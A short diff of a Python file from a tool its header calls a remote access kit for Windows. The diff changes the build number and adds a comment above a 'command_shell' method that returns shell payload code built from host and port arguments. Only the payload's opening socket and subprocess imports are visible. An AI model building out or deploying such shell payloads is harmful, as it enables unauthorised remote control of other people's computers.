@@ -10,7 +10,7 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.21
+# Build:  1.0.22
 # -------------------------------------------------------------
 """
 Define a class to store payload strings.
@@ -67,6 +67,7 @@ else:
 """
         return code
 
+    #Function will return the code for a command shell
     def command_shell(self,host,port):
         code = f"""import socket as s
 import subprocess as r
